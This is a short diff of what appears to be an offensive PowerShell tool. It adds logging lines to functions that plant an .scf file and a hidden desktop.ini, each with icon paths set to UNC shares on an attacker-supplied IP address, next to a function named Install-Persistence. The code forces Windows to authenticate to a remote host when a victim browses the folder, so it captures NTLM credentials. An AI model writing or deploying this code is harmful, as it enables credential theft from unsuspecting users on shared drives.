@@ -65,6 +65,7 @@ function Write-SCFFile
     "IconFile=\\$IPaddress\remote.ico" >> $Location\~T0P0092.scf; 
     "[Taskbar]" >> $Location\~T0P0092.scf; 
     "Command=ToggleDesktop" >> $Location\~T0P0092.scf; 
+    Write-Output "Written SCF File: $Location\~T0P0092.scf"
 }
 function Write-INIFile 
 {
@@ -72,6 +73,7 @@ function Write-INIFile
     "[.ShellClassInfo]" > $Location\desktop.ini
     "IconResource=\\$IPAddress\resource.dll" >> $Location\desktop.ini
     $a = Get-item $Location\desktop.ini -Force; $a.Attributes="Hidden"
+    Write-Output "Written INI File: $Location\desktop.ini"
 }
 Function Install-Persistence
 {
